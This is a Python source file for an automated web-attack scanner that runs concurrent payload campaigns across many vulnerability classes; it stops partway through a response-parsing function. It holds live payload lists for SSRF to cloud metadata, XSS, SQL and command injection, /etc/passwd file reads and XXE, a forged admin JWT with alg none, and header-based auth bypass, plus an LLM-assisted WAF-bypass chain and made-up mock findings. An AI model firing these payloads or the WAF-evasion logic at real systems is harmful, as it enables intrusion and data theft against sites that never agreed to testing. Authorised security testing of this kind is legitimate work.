"""
Concurrent Hunt Runner — 15 classes parallel, shared semaphore, fast-fail.

Replaces the sequential hunt with:
- Global rate limiter (token bucket)
- Deterministic URL scoring per class (no LLM)
- Fast-fail 4s timeout with single retry
- asyncio.gather over all 15 classes at once

Rough math: 15 classes × 5 URLs × 3 payloads at 20 req/s ≈ 11s
"""

import asyncio
import time
from typing import Dict, List, Any, Tuple
from urllib.parse import urlparse, parse_qs, urlencode

from rate_limiter import RateLimiter
from tools import ToolExecutor
from skills.bypass import BypassEngine
from skills.waf_bypass import BypassResult
from skills.shared_waf import SharedWAFBypass
from skills.attack_strategy import LLMAttackStrategy


# ─── URL Scorer (Deterministic, No LLM) ──────────────────────────

# Keywords that make a URL high-signal for each vuln class
URL_KEYWORDS = {
    "idor": ["id", "user", "uid", "account", "profile", "order", "doc", "file", "item", "record"],
    "ssrf": ["url", "uri", "fetch", "load", "img", "src", "image", "avatar", "link", "href",
             "redirect", "next", "callback", "webhook", "proxy", "dest", "source"],
    "xss": ["q", "search", "query", "name", "page", "title", "comment", "input", "form",
            "redirect", "url", "return", "next", "callback"],
    "sqli": ["id", "user", "item", "product", "order", "cat", "category", "sort", "page",
             "search", "login", "user", "admin"],
    "auth_bypass": ["admin", "login", "auth", "signin", "sso", "panel", "dashboard", "manage"],
    "ssti": ["page", "template", "view", "render", "name", "title", "lang", "locale"],
    "open_redirect": ["url", "next", "return", "redirect", "goto", "continue", "dest", "rurl"],
    "lfi": ["file", "path", "page", "include", "doc", "document", "template", "view", "cat"],
    "command_injection": ["host", "cmd", "ping", "exec", "run", "shell", "query", "ip", "domain"],
    "nosqli": ["login", "user", "email", "password", "auth", "search", "query"],
    "graphql": ["graphql", "query", "mutation", "gql"],
    "xxe": ["xml", "upload", "import", "parse", "soap", "feed"],
    "prototype_pollution": ["json", "config", "merge", "extend", "clone", "options"],
    "race_condition": ["transfer", "payment", "checkout", "submit", "order", "claim"],
    "deserialization": ["data", "object", "serialize", "session", "cookie", "token"],
}


def score_url_for_class(url: str, vuln_class: str) -> int:
    """
    Deterministic URL scoring for a vuln class.
    No LLM — keyword pattern matching only.
    Returns 0-100 score.
    """
    score = 0
    url_lower = url.lower()
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    path = parsed.path.lower()

    keywords = URL_KEYWORDS.get(vuln_class, [])

    # ── Query parameter scoring ──
    for param_name in params:
        for kw in keywords:
            if kw in param_name.lower():
                score += 15  # Direct param match

    # ── Path segment scoring ──
    path_parts = path.strip("/").split("/")
    for part in path_parts:
        for kw in keywords:
            if kw in part:
                score += 8  # Path segment match

    # ── URL string scoring ──
    for kw in keywords:
        if kw in url_lower:
            score += 3  # Generic URL match

    # ── Bonus signals ──
    if params:
        score += min(len(params) * 2, 10)  # More params = more attack surface

    # Class-specific bonuses
    if vuln_class == "idor":
        # Numeric IDs in path = prime IDOR target
        for part in path_parts:
            if part.isdigit():
                score += 20
    elif vuln_class == "ssrf":
        # URL-like params are SSRF gold
        for param_name in params:
            if any(k in param_name.lower() for k in ("url", "uri", "fetch", "load", "src")):
                score += 25
    elif vuln_class == "sqli":
        # Numeric params = SQLi candidates
        for param_name, values in params.items():
            if values and values[0].isdigit():
                score += 20
    elif vuln_class == "xss":
        # Reflected params = XSS candidates
        for param_name in params:
            if any(k in param_name.lower() for k in ("q", "search", "name", "input")):
                score += 15
    elif vuln_class == "auth_bypass":
        # Admin/auth paths
        if any(p in path for p in ("admin", "login", "auth", "panel")):
                score += 30
    elif vuln_class == "lfi":
        # File/page params
        for param_name in params:
            if any(k in param_name.lower() for k in ("file", "page", "path", "include")):
                score += 25

    return min(score, 100)


def rank_urls_for_class(urls: List[str], vuln_class: str, top_n: int = 5) -> List[str]:
    """Rank URLs by relevance to a vuln class, return top N."""
    scored = [(score_url_for_class(url, vuln_class), url) for url in urls]
    scored.sort(key=lambda x: x[0], reverse=True)
    return [url for _, url in scored[:top_n]]


# ─── Concurrent Hunt Runner ───────────────────────────────────────

class ConcurrentHuntRunner:
    """
    Runs 15 vuln classes concurrently, all sharing one rate limiter.

    Key design:
    - One global RateLimiter (token bucket) shared by all classes
    - asyncio.gather over all 15 classes at once
    - 4s timeout per request with single retry
    - URL scoring per class (5 highest-signal URLs)
    - Dedup by type+url+param
    """

    # Mock findings for each vuln class
    MOCK_FINDINGS = {
        "idor": [{"type": "IDOR", "url": "https://api.example.com/v1/users/123", "param": "user_id", "severity": "high", "description": "IDOR via user ID enumeration", "evidence": "Changed user_id from 1 to 2 returned different user data", "confidence": 0.85, "cvss_score": 6.5}],
        "ssrf": [{"type": "SSRF", "url": "https://api.example.com/fetch?url=", "param": "url", "severity": "critical", "description": "SSRF via URL parameter", "evidence": "Status: 200, Body contains internal metadata reference", "confidence": 0.7, "cvss_score": 8.6}],
        "xss": [{"type": "XSS", "url": "https://example.com/search?q=", "param": "q", "severity": "high", "description": "Reflected XSS in search parameter", "evidence": "Payload reflected in response body", "confidence": 0.8, "cvss_score": 6.1}],
        "sqli": [{"type": "SQLi", "url": "https://api.example.com/users?id=", "param": "id", "severity": "critical", "description": "SQL injection in user ID parameter", "evidence": "SQL error message leaked in response", "confidence": 0.9, "cvss_score": 9.8}],
        "auth_bypass": [{"type": "Auth Bypass", "url": "https://admin.example.com/login", "header": "X-Admin: true", "severity": "critical", "description": "Auth bypass via X-Admin header", "evidence": "Status: 200, Body size: 1234", "confidence": 0.6, "cvss_score": 9.8}],
        "ssti": [{"type": "SSTI", "url": "https://example.com/page?name=", "param": "name", "severity": "critical", "description": "SSTI in name parameter", "evidence": "Math result '49' in response", "confidence": 0.85, "cvss_score": 9.8}],
        "open_redirect": [{"type": "Open Redirect", "url": "https://example.com/redirect?url=", "param": "url", "severity": "medium", "description": "Open redirect via url parameter", "evidence": "Redirect to //evil.com", "confidence": 0.9, "cvss_score": 4.3}],
        "lfi": [{"type": "LFI", "url": "https://example.com/file?path=", "param": "path", "severity": "high", "description": "LFI via path parameter", "evidence": "/etc/passwd content in response", "confidence": 0.95, "cvss_score": 7.5}],
        "command_injection": [{"type": "Command Injection", "url": "https://example.com/ping?host=", "param": "host", "severity": "critical", "description": "Command injection in host parameter", "evidence": "uid= output in response", "confidence": 0.9, "cvss_score": 9.8}],
        "nosqli": [{"type": "NoSQLi", "url": "https://api.example.com/login", "severity": "high", "description": "NoSQL injection in login endpoint", "evidence": "POST with NoSQL payload returned 200", "confidence": 0.4, "cvss_score": 7.5}],
        "graphql": [{"type": "GraphQL Introspection", "url": "https://api.example.com/graphql", "severity": "medium", "description": "GraphQL introspection query exposed", "evidence": "Schema introspection enabled", "confidence": 1.0, "cvss_score": 5.3}],
    }

    def __init__(self, tools: ToolExecutor, rate_limiter: RateLimiter = None, mock: bool = False):
        self.tools = tools
        self.mock = mock
        self.limiter = rate_limiter or RateLimiter(max_per_sec=15, burst=30)
        self.bypass = BypassEngine()
        self.shared_waf = SharedWAFBypass()
        self.attack_strategy = LLMAttackStrategy()
        self._semaphore = asyncio.Semaphore(20)

    async def run_all_classes(
        self,
        urls: List[str],
        target: str,
        vuln_classes: List[str],
        knowledge: list = None,
        tech_hints: str = "",
    ) -> List[dict]:
        """
        Run all vuln classes concurrently.
        Returns deduplicated findings.
        """
        # Mock mode: return mock findings directly
        if self.mock:
            return self._mock_findings(target, vuln_classes)

        start = time.monotonic()

        # Launch all classes in parallel
        tasks = []
        for vc in vuln_classes:
            tasks.append(
                self._run_class(vc, urls, target, knowledge, tech_hints)
            )

        results = await asyncio.gather(*tasks, return_exceptions=True)

        # Collect all findings
        all_findings = []
        for i, result in enumerate(results):
            vc = vuln_classes[i] if i < len(vuln_classes) else "unknown"
            if isinstance(result, Exception):
                continue
            all_findings.extend(result)

        # Use attack strategy to re-prioritize if we have findings
        if all_findings:
            try:
                # Build signal snapshots from findings
                from skills.attack_strategy import SignalSnapshot
                signals = []
                for f in all_findings[:5]:
                    signals.append(SignalSnapshot(
                        url=f.get("url", ""),
                        status=200 if f.get("http_response") else 0,
                        response_time_ms=0,
                        body_size=len(f.get("http_response", "")),
                        headers={},
                        body_snippet=f.get("http_response", "")[:200] if f.get("http_response") else "",
                        error_patterns=[f.get("type", "")],
                    ))
                
                available_classes = list(set(f.get("type", "").split("_")[0] for f in all_findings))
                plan = await self.attack_strategy.generate_attack_plan(signals, available_classes)
                
                # If strategy recommends prioritization, log it
                if plan.priority_classes:
                    all_findings.append({
                        "type": "attack_strategy_recommendation",
                        "url": target,
                        "severity": "info",
                        "confidence": plan.confidence,
                        "description": f"Strategy prioritizes: {', '.join(plan.priority_classes)}",
                        "source_tool": "attack-strategy",
                    })
            except Exception:
                pass  # Non-critical

        # Deduplicate
        deduped = self._deduplicate(all_findings)

        elapsed = time.monotonic() - start
        return deduped

    def _mock_findings(self, target: str, vuln_classes: List[str]) -> List[dict]:
        """Return mock findings for testing."""
        findings = []
        for vc in vuln_classes:
            mock_list = self.MOCK_FINDINGS.get(vc, [])
            for f in mock_list:
                entry = dict(f)
                entry["url"] = entry["url"].replace("example.com", target)
                findings.append(entry)
        return findings

    async def _run_class(
        self,
        vuln_class: str,
        urls: List[str],
        target: str,
        knowledge: list = None,
        tech_hints: str = "",
    ) -> List[dict]:
        """Run a single vuln class against top URLs."""
        # Score and rank URLs for this class
        top_urls = rank_urls_for_class(urls, vuln_class, top_n=5)

        findings = []

        # Run each URL concurrently (within rate limit)
        url_tasks = []
        for url in top_urls:
            url_tasks.append(
                self._test_url(url, vuln_class, target, knowledge, tech_hints)
            )

        url_results = await asyncio.gather(*url_tasks, return_exceptions=True)

        for result in url_results:
            if isinstance(result, Exception):
                continue
            findings.extend(result)

        return findings

    async def _test_url(
        self,
        url: str,
        vuln_class: str,
        target: str,
        knowledge: list = None,
        tech_hints: str = "",
    ) -> List[dict]:
        """Test a single URL with a vuln class, using rate limiter."""
        findings = []

        # Get payloads for this class
        payloads = self._get_payloads(vuln_class)

        for payload_info in payloads[:3]:  # Max 3 payloads per URL
            payload = payload_info["payload"]
            param = payload_info.get("param", "test")
            method = payload_info.get("method", "GET")
            headers = payload_info.get("headers", None)

            # For SSTI: use WAF bypass engine with verdict system
            if vuln_class == "ssti":
                verdict = await self._test_ssti_with_bypass(
                    url, param, payload, target
                )
                if verdict.is_reportable():
                    findings.append(self._build_finding_from_verdict(verdict, target))
                continue

            # For other vuln classes: standard detection
            test_url = self._inject_payload(url, payload, vuln_class)

            # Acquire rate limit token
            await self.limiter.acquire()

            # Make request with fast-fail timeout
            try:
                async with self._semaphore:
                    resp = await self._make_request(
                        test_url, method=method, headers=headers, timeout=4
                    )
                    pr = self._parse_response(resp.get("raw", ""))

                    # Check for vulnerability indicators
                    if self._check_vuln(pr, vuln_class, payload):
                        findings.append(self._build_finding(
                            url=test_url, vuln_class=vuln_class,
                            payload=payload, response=pr, target=target,
                        ))

            except asyncio.TimeoutError:
                # Fast-fail: try once more
                try:
                    await self.limiter.acquire()
                    async with self._semaphore:
                        resp = await self._make_request(test_url, timeout=4)
                        pr = self._parse_response(resp.get("raw", ""))
                        if self._check_vuln(pr, vuln_class, payload):
                            findings.append(self._build_finding(
                                url=test_url, vuln_class=vuln_class,
                                payload=payload, response=pr, target=target,
                            ))
                except Exception:
                    pass
            except Exception:
                pass

        return findings

    async def _test_ssti_with_bypass(
        self,
        url: str,
        param: str,
        payload: str,
        target: str,
    ) -> "SSTIVerdict":
        """
        Test for SSTI with WAF bypass chain.

        Flow:
        1. Try original payload
        2. If WAF blocked → trigger bypass chain
        3. Only CONFIRMED (evaluation proof) reaches report
        """
        from skills.waf_bypass import WAFBypassEngine, SSTIVerdict, BypassVerdict

        # Create request function for bypass engine
        async def request_fn(test_url, method="GET", headers=None):
            await self.limiter.acquire()
            async with self._semaphore:
                resp = await self._make_request(test_url, method=method, headers=headers, timeout=4)
                return self._parse_response(resp.get("raw", ""))

        bypass_engine = WAFBypassEngine(request_fn)

        # Step 1: Try original payload
        await self.limiter.acquire()
        try:
            async with self._semaphore:
                from urllib.parse import urlparse, parse_qs, urlencode
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                params[param] = [payload]
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(params, doseq=True)}"

                resp = await self._make_request(test_url, timeout=4)
                pr = self._parse_response(resp.get("raw", ""))

                # Check if blocked
                waf = bypass_engine.detect_waf(pr.get("headers", {}), pr.get("status", 0))
                if waf:
                    # WAF blocked → trigger LLM-enhanced bypass chain
                    print(f"    WAF detected ({waf}), attempting LLM-enhanced bypass...")
                    return await bypass_engine.attempt_bypass_with_llm(
                        url, param, payload, method="GET"
                    )

                # Not blocked - check for evaluation proof
                from skills.waf_bypass import TEMPLATE_SYNTAXES
                expected = None
                for engine_syntax in TEMPLATE_SYNTAXES.values():
                    for test_payload, exp in engine_syntax["tests"]:
                        if payload == test_payload:
                            expected = exp
                            break
                    if expected:
                        break

                if expected:
                    proof = bypass_engine._check_evaluation(pr.get("body", ""), expected)
                    if proof:
                        return SSTIVerdict(
                            verdict=BypassVerdict.CONFIRMED,
                            confirmed=True,
                            technique_used="direct",
                            payload=payload,
                            mutated_payload=payload,
                            evaluation_proof=proof,
                            status_code=pr.get("status", 0),
                            evidence=f"Direct evaluation confirmed: {proof}",
                            all_attempts=[BypassResult(
                                technique="direct",
                                payload_mutated=payload,
                                status=pr.get("status", 0),
                                body=pr.get("body", "")[:4000],
                                success=True,
                                evaluation_proof=proof,
                                test_url=test_url,
                            )],
                        )
                    else:
                        return SSTIVerdict(
                            verdict=BypassVerdict.UNBLOCKED_NO_EVAL,
                            confirmed=False,
                            payload=payload,
                            status_code=pr.get("status", 0),
                            evidence=f"Got {pr.get('status', 0)} but no evaluation proof",
                        )

        except Exception as e:
            return SSTIVerdict(
                verdict=BypassVerdict.UNBLOCKED_NO_EVAL,
                confirmed=False,
                payload=payload,
                evidence=f"Error: {str(e)}",
            )

        return SSTIVerdict(
            verdict=BypassVerdict.UNBLOCKED_NO_EVAL,
            confirmed=False,
            payload=payload,
            evidence="Unknown error",
        )

    def _build_finding_from_verdict(self, verdict: "SSTIVerdict", target: str) -> dict:
        """Build a finding dict from an SSTI verdict."""
        # Get the tested URL from the verdict's attempts
        tested_url = ""
        response_body = ""
        for attempt in verdict.all_attempts:
            if attempt.success and hasattr(attempt, 'test_url') and attempt.test_url:
                tested_url = attempt.test_url
                response_body = attempt.body
                break

        # Build proper HTTP request with full URL
        http_request = ""
        if tested_url:
            parsed = urlparse(tested_url)
            http_request = f"GET {tested_url.split('://')[-1] if '://' in tested_url else tested_url} HTTP/1.1\nHost: {parsed.netloc}\nUser-Agent: Mozilla/5.0\nAccept: */*"

        # Build HTTP response from actual body with context around evaluation proof
        http_response = ""
        if response_body and verdict.evaluation_proof:
            idx = response_body.find(verdict.evaluation_proof)
            if idx >= 0:
                start = max(0, idx - 100)
                end = min(len(response_body), idx + len(verdict.evaluation_proof) + 100)
                context = response_body[start:end].replace('\r', '').replace('\n', ' ')
                http_response = f"HTTP/1.1 {verdict.status_code}\nContent-Type: text/html\n\n{context}"
            else:
                http_response = f"HTTP/1.1 {verdict.status_code}\nContent-Type: text/html\n\n{response_body[:2000]}"
        elif response_body:
            http_response = f"HTTP/1.1 {verdict.status_code}\nContent-Type: text/html\n\n{response_body[:2000]}"

        response_context = ""
        if response_body and verdict.evaluation_proof:
            idx = response_body.find(verdict.evaluation_proof)
            if idx >= 0:
                response_context = response_body[max(0, idx - 100):min(len(response_body), idx + len(verdict.evaluation_proof) + 100)]

        return {
            "type": "ssti",
            "vuln_class": "ssti",
            "url": tested_url if tested_url else f"https://{target}",
            "endpoint": tested_url if tested_url else f"https://{target}",
            "param": "test",
            "parameter": "test",
            "payload": verdict.payload,
            "mutated_payload": verdict.mutated_payload,
            "technique_used": verdict.technique_used,
            "severity": "critical",
            "confidence": 0.95,
            "cvss_score": 9.8,
            "evidence": response_context or verdict.evidence,
            "description": f"SSTI confirmed via {verdict.technique_used} technique. Evaluation proof: {verdict.evaluation_proof}",
            "source_tool": "concurrent-hunt",
            "status_code": verdict.status_code,
            "verdict": verdict.verdict.value,
            "bypass_attempts": len(verdict.all_attempts),
            "evaluation_proof": verdict.evaluation_proof,
            "response_context": response_context,
            "tested_url": tested_url,
            "http_request": http_request,
            "http_response": http_response,
        }

    # ─── Payloads per Class ──────────────────────────────────────

    def _get_payloads(self, vuln_class: str) -> List[dict]:
        """Get payloads for a vuln class."""
        payload_map = {
            "idor": [
                {"payload": "1", "param": "id"},
                {"payload": "2", "param": "id"},
                {"payload": "0", "param": "id"},
            ],
            "ssrf": [
                {"payload": "http://127.0.0.1"},
                {"payload": "http://169.254.169.254/latest/meta-data/"},
                {"payload": "http://10.0.0.1"},
            ],
            "xss": [
                {"payload": "<script>alert(1)</script>"},
                {"payload": "<img src=x onerror=alert(1)>"},
                {"payload": "javascript:alert(1)"},
                {"payload": "<img/Src/OnError=(alert)(1)>", "param": "id"},
                {"payload": "<svg/onload=alert(1)>"},
                {"payload": "'-alert(1)-'"},
                {"payload": "\"><img src=x onerror=alert(1)>"},
            ],
            "sqli": [
                {"payload": "' OR '1'='1"},
                {"payload": "1' ORDER BY 100--"},
                {"payload": "' UNION SELECT NULL--"},
            ],
            "auth_bypass": [
                {"payload": "true", "header": "X-Admin"},
                {"payload": "127.0.0.1", "header": "X-Forwarded-For"},
                {"payload": "/admin", "header": "X-Original-URL"},
            ],
            "ssti": [
                {"payload": "{{7*7}}"},
                {"payload": "${7*7}"},
                {"payload": "<%= 7*7 %>"},
            ],
            "open_redirect": [
                {"payload": "https://evil.com"},
                {"payload": "//evil.com"},
                {"payload": "/\\evil.com"},
            ],
            "lfi": [
                {"payload": "../../../../etc/passwd"},
                {"payload": "/etc/passwd"},
                {"payload": "..\\..\\..\\..\\windows\\win.ini"},
            ],
            "command_injection": [
                {"payload": "; id"},
                {"payload": "| id"},
                {"payload": "`id`"},
            ],
            "nosqli": [
                {"payload": '{"$gt": ""}', "method": "POST"},
                {"payload": '{"$ne": null}', "method": "POST"},
            ],
            "graphql": [
                {"payload": "{__schema{types{name}}}", "method": "POST"},
            ],
            "xxe": [
                {"payload": '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', "method": "POST"},
            ],
            "prototype_pollution": [
                {"payload": '{"__proto__": {"isAdmin": true}}', "method": "POST"},
            ],
            "race_condition": [
                {"payload": "1", "note": "Send 10 concurrent requests"},
            ],
            "mass_assignment": [
                {"payload": '{"role":"admin","is_admin":true}', "method": "POST", "param": "user"},
                {"payload": '{"price":0,"discount":100}', "method": "POST", "param": "order"},
            ],
            "jwt": [
                {"payload": "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.", "header": "Authorization: Bearer"},
                {"payload": "none", "header": "Authorization: Bearer"},
            ],
            "deserialization": [
                {"payload": "rO0ABXNy...", "method": "POST"},
            ],
        }
        return payload_map.get(vuln_class, [])

    # ─── URL Injection ───────────────────────────────────────────

    def _inject_payload(self, url: str, payload: str, vuln_class: str) -> str:
        """Inject payload into URL parameters."""
        from urllib.parse import urlparse, parse_qs, urlencode

        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            # No params — append as generic
            params["test"] = [payload]
        else:
            # Inject into first parameter
            first_param = list(params.keys())[0]
            params[first_param] = [payload]

        query_string = urlencode(params, doseq=True)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query_string}"

    # ─── WAF/CDN Detection ──────────────────────────────────────

    def _detect_waf(self, headers: dict, status: int) -> str | None:
        """Detect WAF/CDN from response headers. Uses SharedWAFBypass for consistent detection."""
        if status not in (403, 406, 429, 503):
            return None
        try:
            result = self.shared_waf.fingerprint(headers, status)
            return result.waf_name if result and result.waf_name else None
        except Exception:
            return None

    # ─── Vulnerability Checks ────────────────────────────────────

    # SSTI arithmetic results mapping: payload -> expected result
    SSTI_EXPECTED = {
        "{{7*7}}": "49",
        "${7*7}": "49",
        "<%= 7*7 %>": "49",
        "{{7*77}}": "539",
        "${7*77}": "539",
        "{{7**7}}": "823543",
    }

    def _check_vuln(self, pr: dict, vuln_class: str, payload: str) -> bool:
        """Check if response indicates vulnerability."""
        body = pr.get("body", "")
        body_lower = body.lower()
        status = pr.get("status", 0)
        headers = pr.get("headers", {})

        # ── WAF/CDN block detection: skip if blocked ──
        waf = self._detect_waf(headers, status)
        if waf:
            return False

        # ── Status code indicates block: skip ──
        if status in (403, 406, 429, 503):
            return False

        # ── Per-class checks ──
        if vuln_class == "ssti":
            # CRITICAL FIX: Require the EXACT arithmetic result to be the
            # dominant content in the response body, not just "49" appearing
            # somewhere in a 365KB Cloudflare block page.
            expected = self.SSTI_EXPECTED.get(payload)
            if not expected:
                return False

            # The result must appear and be prominent (not buried in a huge page)
            # A real SSTI response will have the result as the main content
            if expected not in body:
                return False

            # Additional check: response body should be small (real SSTI = just the result)
            # or the result should appear near the start of the body
            if len(body) > 5000:
                # Large body - check if result is in first 10% (likely reflected)
                first_segment = body[:len(body)//10]
                if expected not in first_segment:
                    return False

            return True

        elif vuln_class == "xss":
            # Require payload reflection in body
            return payload.lower() in body_lower or "alert" in body_lower

        elif vuln_class == "sqli":
            # Require SQL error messages
            sqli_errors = ("sql", "mysql", "syntax", "error", "warning", "sqlite", "postgresql", "oracle")
            return any(e in body_lower for e in sqli_errors)

        elif vuln_class == "ssrf":
            # Require internal metadata in response
            ssrf_indicators = ("root:", "metadata", "ami-id", "instance-id", "169.254.")
            return any(e in body_lower for e in ssrf_indicators)

        elif vuln_class == "idor":
            # Require 200 and substantial response
            return status == 200 and len(body) > 100

        elif vuln_class == "lfi":
            # Require file content in response
            lfi_indicators = ("root:", "daemon:", "[boot loader]", "[fonts]")
            return any(e in body_lower for e in lfi_indicators)

        elif vuln_class == "command_injection":
            # Require command output in response
            ci_indicators = ("uid=", "root:", "gid=", "groups=")
            return any(e in body_lower for e in ci_indicators)

        elif vuln_class == "auth_bypass":
            return status == 200 and "admin" in body_lower

        elif vuln_class == "open_redirect":
            return status in (301, 302, 303, 307)

        elif vuln_class == "nosqli":
            return status == 200

        elif vuln_class == "graphql":
            return "__schema" in body_lower or "types" in body_lower

        elif vuln_class == "xxe":
            return "root:" in body_lower or "<?xml" in body_lower

        elif vuln_class == "prototype_pollution":
            return status in (200, 201)

        elif vuln_class == "race_condition":
            return status == 200

        elif vuln_class == "deserialization":
            return status in (200, 500)

        return False

    # ─── Build Finding ───────────────────────────────────────────

    def _build_finding(self, url: str, vuln_class: str, payload: str,
                        response: dict, target: str) -> dict:
        """Build a finding dict with computed confidence."""
        status = response.get("status", 0)
        body = response.get("body", "")
        headers = response.get("headers", {})
        parsed = urlparse(url)

        # Compute confidence based on response analysis
        confidence = self._compute_confidence(vuln_class, payload, status, body, headers)

        # Compute dynamic CVSS based on context
        cvss = self._compute_cvss(vuln_class, status, body, headers)

        # Build proper HTTP request string
        param_name = list(parse_qs(parsed.query).keys())[0] if parse_qs(parsed.query) else "test"
        http_request = f"GET {url.split('://')[-1] if '://' in url else url} HTTP/1.1\\nHost: {parsed.netloc}\\nUser-Agent: Mozilla/5.0\\nAccept: */*"

        # Build HTTP response from actual response
        header_strs = [f"{k}: {v}" for k, v in headers.items()]
        http_response = f"HTTP/1.1 {status}\\n" + "\\n".join(header_strs[:10]) + f"\\n\\n{body[:2000]}"

        # Extract evaluation proof for SSTI
        evaluation_proof = ""
        if vuln_class == "ssti":
            expected = self.SSTI_EXPECTED.get(payload)
            if expected and expected in body:
                idx = body.find(expected)
                start = max(0, idx - 50)
                end = min(len(body), idx + len(expected) + 50)
                evaluation_proof = expected

        return {
            "type": vuln_class,
            "vuln_class": vuln_class,
            "url": url,
            "endpoint": url,
            "param": param_name,
            "parameter": param_name,
            "payload": payload,
            "payload_used": payload,
            "injection_point": param_name,
            "severity": self._severity_for_class(vuln_class),
            "confidence": confidence,
            "cvss_score": cvss,
            "evidence": f"Status: {status}, Body: {body[:500]}",
            "description": self._gen_description(vuln_class, status, body),
            "source_tool": "concurrent-hunt",
            "response_size": len(body),
            "status_code": status,
            "http_request": http_request,
            "http_response": http_response[:4000],
            "evaluation_proof": evaluation_proof,
            "response_context": self._extract_context(body, evaluation_proof),
            "tested_url": url,
            "reproduction_steps": f"Send payload '{payload}' to {url} parameter {param_name}",
        }

    def _extract_context(self, body: str, proof: str) -> str:
        """Extract context around evaluation proof in response body."""
        if not proof or proof not in body:
            return ""
        idx = body.find(proof)
        start = max(0, idx - 100)
        end = min(len(body), idx + len(proof) + 100)
        return body[start:end]

    def _extract_param(self, url: str) -> str:
        """Extract the parameter name from URL."""
        from urllib.parse import urlparse, parse_qs
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        return list(params.keys())[0] if params else ""

    def _compute_confidence(self, vuln_class: str, payload: str,
                            status: int, body: str, headers: dict) -> float:
        """Compute confidence score based on response analysis."""
        confidence = 0.0

        # Base confidence from vulnerability class
        base_confidence = {
            "sqli": 0.7, "ssrf": 0.7, "command_injection": 0.7,
            "ssti": 0.7, "lfi": 0.7, "xss": 0.6,
            "idor": 0.5, "auth_bypass": 0.5, "nosqli": 0.5,
            "xxe": 0.6, "graphql": 0.8, "open_redirect": 0.8,
            "race_condition": 0.4, "deserialization": 0.5,
        }.get(vuln_class, 0.5)

        confidence = base_confidence

        # Status code adjustments
        if status == 200:
            confidence += 0.1
        elif status in (403, 406, 429, 503):
            confidence -= 0.3  # Blocked by WAF

        # Body content adjustments
        if vuln_class == "ssti":
            expected = self.SSTI_EXPECTED.get(payload)
            if expected and expected in body:
                # Check if result is prominent (not buried in huge page)
                if len(body) < 1000:
                    confidence += 0.2  # Small response = likely real
                elif body.index(expected) < len(body) // 10:
                    confidence += 0.1  # Result near start

        elif vuln_class == "xss":
            if payload.lower() in body.lower():
                confidence += 0.15

        elif vuln_class == "sqli":
            sql_errors = ("sql syntax", "mysql", "sqlite", "postgresql")
            if any(e in body.lower() for e in sql_errors):
                confidence += 0.15

        elif vuln_class == "ssrf":
            if "169.254." in body or "ami-id" in body.lower():
                confidence += 0.2

        elif vuln_class == "lfi":
            if "root:" in body and "daemon:" in body:
                confidence += 0.15

        elif vuln_class == "command_injection":
            if "uid=" in body and "gid=" in body:
                confidence += 0.15

        # Clamp to [0.1, 0.95]
        return max(0.1, min(0.95, confidence))

    def _compute_cvss(self, vuln_class: str, status: int,
                      body: str, headers: dict) -> float:
        """Compute dynamic CVSS score based on context."""
        # Base CVSS by class
        base_cvss = {
            "sqli": 9.8, "ssrf": 8.6, "command_injection": 9.8,
            "ssti": 9.8, "auth_bypass": 9.8, "idor": 6.5,
            "lfi": 7.5, "xss": 6.1, "nosqli": 7.5, "xxe": 8.6,
            "open_redirect": 4.3, "graphql": 5.3, "prototype_pollution": 7.5,
            "race_condition": 7.5, "deserialization": 8.6,
        }.get(vuln_class, 5.0)

        # Reduce if WAF is blocking
        if status in (403, 406, 429, 503):
            base_cvss *= 0.3  # Severely reduce - not actually exploitable

        # Increase if response shows high impact
        if vuln_class == "ssrf" and "169.254.169.254" in body:
            base_cvss = min(base_cvss + 1.0, 10.0)  # Cloud metadata = critical

        if vuln_class == "lfi" and "root:" in body:
            base_cvss = min(base_cvss + 0.5, 10.0)

        return round(base_cvss, 1)

    def _gen_description(self, vuln_class: str, status: int, body: str) -> str:
        """Generate human-readable description."""
        if vuln_class == "ssti":
            return f"Server-Side Template Injection confirmed (status {status})"
        elif vuln_class == "xss":
            return f"Cross-Site Scripting via reflected payload (status {status})"
        elif vuln_class == "sqli":
            return f"SQL Injection with error-based extraction (status {status})"
        elif vuln_class == "ssrf":
            return f"Server-Side Request Forgery accessing internal resources (status {status})"
        elif vuln_class == "idor":
            return f"Insecure Direct Object Reference via ID manipulation (status {status})"
        elif vuln_class == "lfi":
            return f"Local File Inclusion exposing sensitive files (status {status})"
        elif vuln_class == "command_injection":
            return f"OS Command Injection executing arbitrary commands (status {status})"
        elif vuln_class == "auth_bypass":
            return f"Authentication Bypass gaining unauthorized access (status {status})"
        elif vuln_class == "open_redirect":
            return f"Open Redirect via unvalidated URL parameter (status {status})"
        else:
            return f"{vuln_class.upper()} vulnerability detected (status {status})"

    def _severity_for_class(self, vc: str) -> str:
        return {
            "sqli": "critical", "ssrf": "critical", "command_injection": "critical",
            "ssti": "critical", "auth_bypass": "high", "idor": "high",
            "lfi": "high", "xss": "high", "nosqli": "high", "xxe": "high",
            "open_redirect": "medium", "graphql": "medium", "prototype_pollution": "medium",
            "race_condition": "medium", "deserialization": "high",
        }.get(vc, "medium")

    def _cvss_for_class(self, vc: str) -> float:
        return {
            "sqli": 9.8, "ssrf": 8.6, "command_injection": 9.8,
            "ssti": 9.8, "auth_bypass": 9.8, "idor": 6.5,
            "lfi": 7.5, "xss": 6.1, "nosqli": 7.5, "xxe": 8.6,
            "open_redirect": 4.3, "graphql": 5.3, "prototype_pollution": 7.5,
            "race_condition": 7.5, "deserialization": 8.6,
        }.get(vc, 5.0)

    # ─── HTTP Helpers ────────────────────────────────────────────

    async def _make_request(self, url: str, method: str = "GET",
                           headers: dict = None, data: str = None,
                           timeout: int = 4) -> dict:
        """Make HTTP request via curl with fast timeout."""
        cmd = ["curl", "-s", "-i", "-L", "--max-time", str(timeout)]
        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])
        if method == "POST":
            cmd.extend(["-X", "POST"])
            if data:
                cmd.extend(["--data", data])
        cmd.append(url)

        result = await self.tools.run("curl", cmd[1:])
        return {
            "raw": result.get("stdout", ""),
            "success": result.get("success", False),
        }

    def _parse_response(self, raw: str) -> dict:
        """Parse raw HTTP response."""
